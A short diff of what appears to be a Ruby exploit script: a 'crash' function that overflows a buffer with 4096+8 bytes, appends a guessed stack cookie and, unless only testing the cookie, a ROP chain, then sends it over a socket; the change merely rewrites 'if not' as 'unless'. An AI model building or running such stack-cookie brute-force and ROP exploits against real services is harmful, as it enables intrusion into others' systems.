@@ -79,7 +79,7 @@ def crash(cookie, cookie_test=true)
       $count += 1
 
       payload << ["A"*(4096+8), cookie].join
-      payload << ["C"*24, $ropchain].join if not cookie_test
+      payload << ["C"*24, $ropchain].join unless cookie_test
 
       s.send(payload,0)
       data = s.recv(10)
